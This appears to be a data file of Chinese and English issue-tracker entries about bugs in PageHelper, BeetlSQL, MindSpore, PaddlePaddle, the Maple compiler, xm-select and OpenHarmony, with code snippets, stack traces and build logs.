offset分页疑问,"当数据有20条，当传入offset=19,limit=5返回了最后一页，也就是从offset=15开始查了，但是reasonable=false,具体如下： page=PBPageInfo{total=20, pageOffset=24, pageSize=5}}   <code>: //分页插件 PageHelper pageHelper = new PageHelper(); Properties properties = new Properties(); // properties.setProperty(""reasonable"", ""false""); // properties.setProperty(""supportMethodsArguments"", ""true""); // properties.put(""offsetAsPageNum"", ""false""); // properties.setProperty(""returnPageInfo"", ""check""); // properties.setProperty(""params"", ""count=countSql""); properties.setProperty(""dialect"", ""postgresql""); pageHelper.setProperties(properties); int offset = PBForumPostFindReq.DEFAULT_OFFSET, limit = PBForumPostFindReq.DEFAULT_LIMIT; Map parameter = new HashMap&lt;&gt;(); if(pbForumPostFindReq != null) { offset = pbForumPostFindReq.offset != null &amp;&amp; pbForumPostFindReq.offset &gt; 0 ? pbForumPostFindReq.offset : offset; limit = pbForumPostFindReq.limit != null &amp;&amp; pbForumPostFindReq.limit &gt; 0 ? pbForumPostFindReq.limit : limit; parameter.put(""forumId"", pbForumPostFindReq.forumId); parameter.put(""postType"", pbForumPostFindReq.postType); parameter.put(""keyword"", pbForumPostFindReq.keyword); parameter.put(""isEssential"", pbForumPostFindReq.isEssential); parameter.put(""isTop"", pbForumPostFindReq.isTop); parameter.put(""startTime"", pbForumPostFindReq.startTime); parameter.put(""endTime"", pbForumPostFindReq.endTime); parameter.put(""userId"", pbForumPostFindReq.userId); } PageHelper.startPage(offset / limit + 1, limit); PageInfo&lt;ForumPost&gt; pageInfo = new PageInfo&lt;&gt;(forumPostMapper.findByMap(parameter));"
打包运行后SQL文件出现「变量未定义(VAR_NOT_DEFINED)」,"版本：3.1 关键代码如下： 本地开发时正常使用，但是打包在服务器（CentOS 7.6.1810）上运行后出现如下异常：   <code>: PageResult&lt;Coupon&gt; pageOfGoodsInStore(Integer goodsId, Integer storeId, Integer userId, PageRequest&lt;Coupon&gt; pageRequest); pageOfGoodsInStore === * 商品在相关门店的优惠券列表 select -- @pageTag(){ a.*, (select IFNULL(count(1),0) from user_coupon b where b.coupon_id = a.id and b.user_id = #{userId}) as hasCount, (select count(1) from user_coupon b where b.coupon_id = a.id and b.user_id = #{userId} and use_status != 0) as useCount -- @} from coupon a where exists ( select 1 from coupon_goods c where c.goods_id = #{goodsId} and c.coupon_id = a.id ) and EXISTS ( select 1 from coupon_store d where d.coupon_id = a.id and d.store_id = #{storeId} ) and a.deleted = 0 AND a.type = 2 org.beetl.sql.clazz.kit.BeetlSQLException: SQL Script Error:&gt;&gt;11:09:08:变量未定义(VAR_NOT_DEFINED):storeId 位于15行 资源:coupon.pageOfGoodsInStore at org.beetl.sql.core.engine.BeetlSQLTemplateExceptionHandler.processExcption(BeetlSQLTemplateExceptionHandler.java:79) at org.beetl.core.Template.renderTo(Template.java:166) at org.beetl.core.Template.renderTo(Template.java:90) at org.beetl.core.Template.render(Template.java:81) at org.beetl.sql.core.engine.template.BeetlSQLTemplate.render(BeetlSQLTemplate.java:31) at org.beetl.sql.core.BaseSQLExecutor.run(BaseSQLExecutor.java:1054) at org.beetl.sql.core.BaseSQLExecutor.run(BaseSQLExecutor.java:1024) at org.beetl.sql.core.BaseSQLExecutor.select(BaseSQLExecutor.java:129) at org.beetl.sql.core.BaseSQLExecutor.selectUnique(BaseSQLExecutor.java:100) at org.beetl.sql.core.SQLManager.pageQuery(SQLManager.java:450) at org.beetl.sql.mapper.identity.PageRMI.call(PageRMI.java:25) at org.beetl.sql.mapper.MapperJavaProxy.invoke(MapperJavaProxy.java:130) at org.beetl.sql.mapper.MapperJava8Proxy.invoke(MapperJava8Proxy.java:85) at com.sun.proxy.$Proxy139.pageOfGoodsInStore(Unknown Source) at com.bingorl.omg.module.system.service.CouponService.listOfGoodsWithLimit(CouponService.java:35) at com.bingorl.omg.module.system.service.CouponService$$FastClassBySpringCGLIB$$80d64c02.invoke(&lt;generated&gt;) at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:204) at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:685) at com.bingorl.omg.module.system.service.CouponService$$EnhancerBySpringCGLIB$$48060b1e.listOfGoodsWithLimit(&lt;generated&gt;) at com.bingorl.omg.module.rest.service.V2IGoodsInfoService.detail(V2IGoodsInfoService.java:296) at com.bingorl.omg.module.rest.service.V2IGoodsInfoService$$FastClassBySpringCGLIB$$acbd9556.invoke(&lt;generated&gt;) at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:204) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.invokeJoinpoint(CglibAopProxy.java:747) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:163) at org.springframework.transaction.interceptor.TransactionAspectSupport.invokeWithinTransaction(TransactionAspectSupport.java:294) at org.springframework.transaction.interceptor.TransactionInterceptor.invoke(TransactionInterceptor.java:98) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:185) at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:689) at com.bingorl.omg.module.rest.service.V2IGoodsInfoService$$EnhancerBySpringCGLIB$$bd1a5b9a.detail(&lt;generated&gt;) at com.bingorl.omg.module.rest.controller.V2GoodsInfoController.detail(V2GoodsInfoController.java:48) at com.bingorl.omg.module.rest.controller.V2GoodsInfoController$$FastClassBySpringCGLIB$$a984b7a1.invoke(&lt;generated&gt;) at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:204) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.invokeJoinpoint(CglibAopProxy.java:747) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:163) at org.springframework.aop.aspectj.MethodInvocationProceedingJoinPoint.proceed(MethodInvocationProceedingJoinPoint.java:89) at com.bingorl.omg.core.intercept.SessionHolderInterceptor.sessionKit(SessionHolderInterceptor.java:29) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethodWithGivenArgs(AbstractAspectJAdvice.java:644) at org.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethod(AbstractAspectJAdvice.java:633) at org.springframework.aop.aspectj.AspectJAroundAdvice.invoke(AspectJAroundAdvice.java:70) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:185) at org.springframework.aop.framework.adapter.AfterReturningAdviceInterceptor.invoke(AfterReturningAdviceInterceptor.java:52) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:185) at org.springframework.aop.interceptor.ExposeInvocationInterceptor.invoke(ExposeInvocationInterceptor.java:92) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:185) at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:689) at com.bingorl.omg.module.rest.controller.V2GoodsInfoController$$EnhancerBySpringCGLIB$$d7d67f9a.detail(&lt;generated&gt;) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:209) at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:136) at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:102) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:877) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:783) at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:991) at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:925) at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:974) at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:866) at javax.servlet.http.HttpServlet.service(HttpServlet.java:635) at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:851) at javax.servlet.http.HttpServlet.service(HttpServlet.java:742) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.shiro.web.servlet.ProxiedFilterChain.doFilter(ProxiedFilterChain.java:61) at org.apache.shiro.web.servlet.AdviceFilter.executeChain(AdviceFilter.java:108) at org.apache.shiro.web.servlet.AdviceFilter.doFilterInternal(AdviceFilter.java:137) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) at org.apache.shiro.web.servlet.ProxiedFilterChain.doFilter(ProxiedFilterChain.java:66) at org.apache.shiro.web.servlet.AbstractShiroFilter.executeChain(AbstractShiroFilter.java:449) at org.apache.shiro.web.servlet.AbstractShiroFilter$1.call(AbstractShiroFilter.java:365) at org.apache.shiro.subject.support.SubjectCallable.doCall(SubjectCallable.java:90) at org.apache.shiro.subject.support.SubjectCallable.call(SubjectCallable.java:83) at org.apache.shiro.subject.support.DelegatingSubject.execute(DelegatingSubject.java:387) at org.apache.shiro.web.servlet.AbstractShiroFilter.doFilterInternal(AbstractShiroFilter.java:362) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.CorsFilter.doFilterInternal(CorsFilter.java:96) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at com.alibaba.druid.support.http.WebStatFilter.doFilter(WebStatFilter.java:124) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at com.bingorl.omg.core.xss.XssFilter.doFilter(XssFilter.java:34) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:99) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.HttpPutFormContentFilter.doFilterInternal(HttpPutFormContentFilter.java:109) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.HiddenHttpMethodFilter.doFilterInternal(HiddenHttpMethodFilter.java:81) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:200) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:198) at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:96) at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:496) at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:140) at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:81) at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:87) at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:342) at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:803) at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:66) at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:790) at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1459) at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) at java.lang.Thread.run(Thread.java:748) Caused by: org.beetl.core.exception.BeetlException: null at org.beetl.core.statement.VarRef.getValue(VarRef.java:171) at org.beetl.core.statement.VarRef.evaluate(VarRef.java:67) at org.beetl.sql.core.engine.SQLPlaceholderST.execute(SQLPlaceholderST.java:45) at org.beetl.core.statement.Program.run(Program.java:61) at org.beetl.core.statement.Program.execute(Program.java:54) at org.beetl.core.Template.renderTo(Template.java:139) ... 126 common frames omitted"
【ST】【MS】【OPS】uniformcandidatesampler算子在mindspore 2.0master分支GPU、CPU后端用例执行dynamic_shape报错,"uniformcandidatesampler算子在mindspore 2.0master分支GPU、CPU后端用例执行dynamic_shape报错 / 硬件环境: /device GPU/CPU : -- MindSpore version : mindspore 2.0.0 commit_id = ''[sha1]:cd15cccd,[branch]:(HEAD,origin/master,origin/HEAD,master)'' -- Python version :python3.7.5 -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph test_ms_ops_uniformcandidatesampler_func_unique_false_num_sampled_less_range_max test_ms_ops_uniformcandidatesampler_func_unique_false_num_sampled_equal_range_max test_ms_ops_uniformcandidatesampler_func_unique_true_num_sampled_equal_range_max test_ms_ops_uniformcandidatesampler_func_unique_true_num_sampled_less_range_max_1 test_ms_ops_uniformcandidatesampler_func_unique_true_num_sampled_less_range_max_2 test_ms_ops_uniformcandidatesampler_func_unique_false_num_sampled_greater_range_max test_ms_ops_uniformcandidatesampler_func_unique_true_remove_accidental_hits_true test_ms_ops_uniformcandidatesampler_func_unique_false_remove_accidental_hits_false_1 test_ms_ops_uniformcandidatesampler_func_unique_false_remove_accidental_hits_false_2 test_ms_ops_uniformcandidatesampler_func_seed_zero_unique_true_remove_accidental_hits_false test_ms_ops_uniformcandidatesampler_func_unique_false_remove_accidental_hits_true test_ms_ops_uniformcandidatesampler_func_unique_false_range_max_greater_num_sample_1 test_ms_ops_uniformcandidatesampler_func_unique_false_range_max_greater_num_sample_2 test_ms_ops_uniformcandidatesampler_func_unique_true_range_max_equal_num_sample test_ms_ops_uniformcandidatesampler_func_remove_accidental_hits_true_num_sampled_greater_range_max export ME_DYNAMIC_SHAPE=1 export DEVICE_TYPE=CPU_X86 / export DEVICE_TYPE=GPU_PCIE pytest -vra test_ms_ops_uniformcandidatesampler_func.py 用例执行通过 `Step1: Start operator func compare. ================================run with dynamic shape================================ FINFO 2022-10-31 15:37:35 - test_ms_ops_uniformcandidatesampler_func - test_ms_ops_uniformcandidatesampler_func.py:teardown:268 - The case teardown is running self.ms_log.step(""Step1: Start operator func compare."") test_ms_ops_uniformcandidatesampler_func.py:122: ../../../../common/ms_aw/operator/candidate_sampling/uniformcandidatesampler_ops.py:121: in forward_cmp out_me = self.forward_mindspore_impl() ../../../../common/ms_aw/operator/candidate_sampling/uniformcandidatesampler_ops.py:93: in forward_mindspore_impl out = net(true_classes) ../../../../common/utils/operator_helper.py:319: in call self.run_dynamic_shape(*args, **kwargs) ../../../../common/utils/operator_helper.py:278: in run_dynamic_shape out_dyn = self.net(*tmp_arg, **kwargs) /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py:640: in call raise err /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py:636: in call output = self._run_construct(args, kwargs) /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py:412: in _run_construct output = self.construct(*cast_inputs, **kwargs) ../../../../common/ms_aw/operator/candidate_sampling/uniformcandidatesampler_ops.py:46: in construct self.remove_accidental_hits) /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/ops/function/random_func.py:336: in uniform_candidate_sampler sampled_candidates, true_expected_count, sampled_expected_count = sampler_op(true_classes) /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/ops/primitive.py:307: in call return _run_op(self, self.name, args) /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/common/api.py:96: in wrapper results = fn(*arg, **kwargs) /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/ops/primitive.py:794: in _run_op output = _pynative_executor.real_run_op(obj, op_name, args)` 梁成辉   <code>: assert fact.forward_cmp()"
[CT][MS][OCCM][combinations]算子输入为空在ascend上 运行用例报错提示和其他后端不同,算子在ascend运行用例 def test_combinations_input_is_null(): x = Tensor([]) input_list = [x] fact = CombinationsMock(inputs=input_list) # with pytest.raises(TypeError): # fact.forward_mindspore_impl() /mode graph test_combinations_input_is_null 正向通过反向报错 合适，并且提示ValueError: input_data can not contain zero dimension   <code>: fact.forward_cmp() fact.grad_cmp() fact.grad_pytorch_impl()
600.perlbench_s's gv.c compiled at -O3 hits assertion caused by DDAA,"Compiling gv.c by passing -O3 to mplme gets this assertion: If I pass -noDDAA, it compiles OK at -O3.   <code>: --Run analysis Phase [ aliasclass ]--- Tid(506907): CHECK/CHECK_FATAL failure: ostIdx &lt; osym2Elem.size() at [../../src/mapleall/maple_me/src/alias_class.cpp:140] Index out of range"
"使用自定义图片数据集时,报错 ""date -d @1515036867"" if you are using GNU date","在使用自定义图片数据集训练时,在训练到一半是突然报错,错误信息如下: 这是什么原因,我图片的命名是用uuid的没有用到时间毫秒,部分数据如下: 读取方式如下:   <code>: Pass 0, Batch 0, Cost 14.597490, {'classification_error_evaluator': 0.7265625} Pass 0, Batch 1, Cost 39.000000, {'classification_error_evaluator': 0.609375} Pass 0, Batch 2, Cost 36.000000, {'classification_error_evaluator': 0.5625} Thread [140661301901056] Forwarding __conv_1__, *** Aborted at 1515036867 (unix time) try ""date -d @1515036867"" if you are using GNU date *** PC: @ 0x0 (unknown) *** SIGFPE (@0x7fee67489187) received by PID 18909 (TID 0x7fee42eef700) from PID 1732809095; stack trace: *** @ 0x7fee82e4d390 (unknown) @ 0x7fee67489187 sgemm_kernel_NEHALEM ../data/image/fee16631-f096-11e7-aff8-2cd05afbe631.png 1 ../data/image/fee16632-f096-11e7-aff8-2cd05afbe631.png 1 ../data/image/fee16633-f096-11e7-aff8-2cd05afbe631.png 1 ../data/image/fee16634-f096-11e7-aff8-2cd05afbe631.png 1 train_reader = paddle.batch( paddle.reader.shuffle( reader.train_reader('../data/trainer.list'), buf_size=1000), batch_size=BATCH_SIZE)"
[ST][MS][Warning]resnet50 gpu 8p cifar10训练产生较多warning日志信息,"resnet50 gpu 8p cifar10训练产生较多warning日志信息 / 硬件环境: /device GPU/等其他芯片 : -- MindSpore version :commit_id = ''[sha1]:59ac7e37,[branch]:(HEAD,origin/r1.8,r1.8)'' -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph test_ms_resnet50_cifar10_train_check_loss_gpu_8p_0002.py cd solution_test/cases/02network/00cv/resnet50/train/ pytest -s test_ms_resnet50_cifar10_train_check_loss_gpu_8p_0002.py 无大量warning日志产生 责任人 郭志建   <code>: [WARNING] ME(10360:139969105569600,MainProcess):2022-07-04-15:38:18.237.775 [mindspore/dataset/engine/datasets.py:1511] This interface will be deleted or invisible in the future. Please use 'project' to change the columns' order and you can use 'create_tuple_iterator' to verify the output order. [WARNING] ME(10360:139969105569600,MainProcess):2022-07-04-15:38:18.237.926 [mindspore/dataset/engine/datasets.py:1511] This interface will be deleted or invisible in the future. Please use 'project' to change the columns' order and you can use 'create_tuple_iterator' to verify the output order. [WARNING] ME(10360:139969105569600,MainProcess):2022-07-04-15:38:18.237.980 [mindspore/dataset/engine/datasets.py:1511] This interface will be deleted or invisible in the future. Please use 'project' to change the columns' order and you can use 'create_tuple_iterator' to verify the output order. [WARNING] ME(10360:139969105569600,MainProcess):2022-07-04-15:38:18.238.029 [mindspore/dataset/engine/datasets.py:1511] This interface will be deleted or invisible in the future. Please use 'project' to change the columns' order and you can use 'create_tuple_iterator' to verify the output order. [WARNING] ME(10360:139969105569600,MainProcess):2022-07-04-15:38:18.238.301 [mindspore/dataset/engine/datasets.py:1331] This interface will be deleted or invisible in the future. Please use 'device_que' to enable dataset sink mode. [WARNING] ME(10361:140208030709568,MainProcess):2022-07-04-15:38:18.244.885 [mindspore/dataset/engine/datasets.py:1511] This interface will be deleted or invisible in the future. Please use 'project' to change the columns' order and you can use 'create_tuple_iterator' to verify the output order. [WARNING] ME(10361:140208030709568,MainProcess):2022-07-04-15:38:18.245.042 [mindspore/dataset/engine/datasets.py:1511] This interface will be deleted or invisible in the future. Please use 'project' to change the columns' order and you can use 'create_tuple_iterator' to verify the output order. [WARNING] ME(10361:140208030709568,MainProcess):2022-07-04-15:38:18.245.094 [mindspore/dataset/engine/datasets.py:1511] This interface will be deleted or invisible in the future. Please use 'project' to change the columns' order and you can use 'create_tuple_iterator' to verify the output order. [WARNING] ME(10361:140208030709568,MainProcess):2022-07-04-15:38:18.245.137 [mindspore/dataset/engine/datasets.py:1511] This interface will be deleted or invisible in the future. Please use 'project' to change the columns' order and you can use 'create_tuple_iterator' to verify the output order. [WARNING] ME(10361:140208030709568,MainProcess):2022-07-04-15:38:18.245.421 [mindspore/dataset/engine/datasets.py:1331] This interface will be deleted or invisible in the future. Please use 'device_que' to enable dataset sink mode."
【bert-min预训练】mindspore版本原因导致编译出错,"在【图模式】【cuda11.6】【python3.7】下，mindspore-gpu 1.9.0.20220915能进行正常的计算图编译，但是用mindspore官方发布的 mindspore-gpu=1.8.1包会报错： [1]is_compile = self._graph_executor.compile(self.fn, compile_args, phase, True) [2]RuntimeError: Unsupported statement 'Try'.!   <code>: class BertForPretraining(BertPretrainedCell): def __init__(self, config, *args, **kwargs): super().__init__(config, *args, **kwargs) self.bert = BertModel(config) self.cls = BertPreTrainingHeads(config) self.vocab_size = config.vocab_size1. 【这行会在计算图编译时报错】self.cls.predictions.decoder.weight = \ self.bert.embeddings.word_embeddings.embedding_table self.loss_fct = nn.CrossEntropyLoss(ignore_index=-1) def construct(self, input_ids, attention_mask=None, token_type_ids=None, position_ids=None, head_mask=None, masked_lm_labels=None, next_sentence_label=None): # ic(""attention_mask"",attention_mask.shape) outputs = self.bert( input_ids, attention_mask=attention_mask, token_type_ids=token_type_ids, position_ids=position_ids, head_mask=head_mask )"
一个页面引入两个下拉树Tree，会相互影响,"一个页面引入两个下拉tree，选择一个会影响另外一个。 现象一： 第一个tree 第二个tree 我设置第一个tree的值，第二个tree也会设置   <code>: var copySelect = xmSelect.render({ el: '#copy', name:'copyUserIds', // max: selectLimit, theme: { color: '#0089ff', }, prop: { name: 'title', value: 'id' }, filterable: true, toolbar: { show: true, list: ['ALL', 'REVERSE', 'CLEAR'] }, tree:{ show:true, showFolderIcon: true, indent: 20, expandedKeys:[295,296,297], clickExpand: true, //点击节点是否选中 clickCheck: true }, height: 'auto', data:treeData }); copySelect.setValue([{title: '张三', id: ""1453011572141084673""}]); var nextApprove = xmSelect.render({ el: '#nextApprove', name:'nextUserIds', theme: { color: '#0089ff', }, prop: { name: 'title', value: 'id' }, filterable: true, toolbar: { show: true, list: ['ALL', 'REVERSE', 'CLEAR'] }, tree:{ show:true, showFolderIcon: true, indent: 20, expandedKeys:[295,296,297], clickExpand: true, //点击节点是否选中 clickCheck: true }, height: 'auto', data:treeData });"
"Build failed on CI with C-API, openblas",The failed job: https://paddleci.ngrok.io/viewLog.html?buildId=20174&amp;buildTypeId=Manylinux1_Cuda80cudnn5avxOpenblas&amp;tab=buildResultsDiv The error logs:   <code>: [13:11:46] + [[ ! -z OFF ]] [13:11:46] + find ./third_party/install -name libmklml_gnu.so -exec cp '{}' output/usr/local/lib ';' [13:11:46] + find ./third_party/install -name libmklml_intel.so -exec cp '{}' output/usr/local/lib ';' [13:11:46] + cp -P './third_party/install/mkldnn/lib/*' output/usr/local/lib/ [13:11:46] cp: cannot stat `./third_party/install/mkldnn/lib/*': No such file or directory
关于依赖注入的问题,1：读取你编写的文档关于属性方式注入的缺点【不直观，无法清晰地表示哪些属性是必须的】，然后不推荐，但是属性注入方式很灵活，减少构造方法的参数，是否采用如下方式呢： [Inject] public TestService TestService { get; set; } 标记一个特性，只有标记了特性的才会注入，这样注入的属性也一目了然 2、有些特定场景不能使用到依赖注入的方式，比如定时任务，但是里面可能会使用到实现了ITransient的服务类，现在的框架有没有解决方案，还是只能new出这个类，有没有类似[]，这种方式，从容器内根据类型或是定义的别名获取实例。   <code>: SpringContext.Inject&lt;ProjectService&gt;()
sequence_expand 使用咨询,"我想复现你们api中的demo。 sequence-expand 貌似并没有像我预期的运行？ 输出了 而不是demo里写的[ [0],[1],[0],[1],[2],[3],[2], [3] ] ??   <code>: import numpy as np import time import paddle import paddle.fluid as fluid import paddle.fluid.core as core import paddle.fluid.framework as framework from paddle.fluid.executor import Executor def to_lodtensor(data, place): """""" convert to LODtensor """""" seq_lens = [len(seq) for seq in data] cur_len = 0 lod = [cur_len] for l in seq_lens: cur_len += l lod.append(cur_len) flattened_data = np.concatenate(data, axis=0).astype(""int64"") res = fluid.LoDTensor() res.set(flattened_data, place) res.set_lod([lod]) return res x = fluid.layers.data(name='x', shape=[1], dtype='float32') y = fluid.layers.data(name='y', shape=[5], dtype='float32') out = fluid.layers.sequence_expand(x=x, y=y, ref_level=-1) place = fluid.CPUPlace() feeder = fluid.DataFeeder(place=place,feed_list=[x,y]) exe = fluid.Executor(place) exe.run(fluid.default_startup_program()) x_d = to_lodtensor( [ np.array( [ [0],[1],[2],[3] ])] , place) y_d = to_lodtensor( [ np.array( [0, 3, 6, 7, 8] ) ], place) results = exe.run(fluid.default_main_program(), feed={'x':x_d, 'y': y_d }, fetch_list=[out],return_numpy=False) print np.array(results[0]).shape print np.array(results[0]) (20, 1) [[0] [1] [2] [3] [0] [1] [2] [3] [0] [1] [2] [3] [0] [1] [2] [3] [0] [1] [2] [3]]"
Refine ExpandConvLayer.cpp,"Based on previous code refactoring #2282:Move `paddle/go` to `go`, the file has been removed. By further refactoring the convolution layer of , we can remove the file. The and implementation in the is less performance, we can use and to replace. After removing the four functions related to the , has only one init function, so we can further refactor to remove this class.   <code>: ExpandConvTransLayer im2col + gemm ExpandConvBaseLayer addSharedBias bpropSharedBias ExpandConvBaseLayer Matrix::addSharedBias Matrix::collectSharedBias bias operation ExpandConvBaseLayer"
jffs2尚未恢复可用,"简要描述： fs/jffs2 【环境信息】: 网络环境 硬件开发板型号 arm-virt 软件版本信息或tag节点 最新代码 测试环境 device_qemu samll系统 其他 【预置条件】: 无 【测试步骤】： hb set #选择samll hb build -f ./qemu-run -f 【预期结果】： 正常启动运行 【实际结果】： 【恢复手段】： 无 【出现概率】：问题出现次数/实际测试次数 100% 【定位信息】： https://gitee.com/openharmony/kernel_liteos_a/blob/master/fs/Kconfig#L7 注释掉了jffs的kconfig。取消注释，编译报错： 可能恢复计划正实施中，这里写下以备忘～   <code>: OsMountRootfs start ... [ERR][KProcess:SystemInit]Failed to find file system jffs2 [ERR][KProcess:SystemInit]Failed to mount /, rootDev /dev/cfiflash0, errno 19: No such device [ERR][KProcess:SystemInit]mount rootfs error! OsMountRootfs end ... [OHOS ERROR] In file included from obj/kernel/liteos_a/fs/jffs2/jffs2_build/fs/jffs2/background.c:15: [OHOS ERROR] obj/kernel/liteos_a/fs/jffs2/jffs2_build/fs/jffs2/nodelist.h:18:10: fatal error: 'jffs2.h' file not found [OHOS ERROR] #include ""jffs2.h"" [OHOS ERROR] ^~~~~~~~~ [OHOS ERROR] 1 error generated."
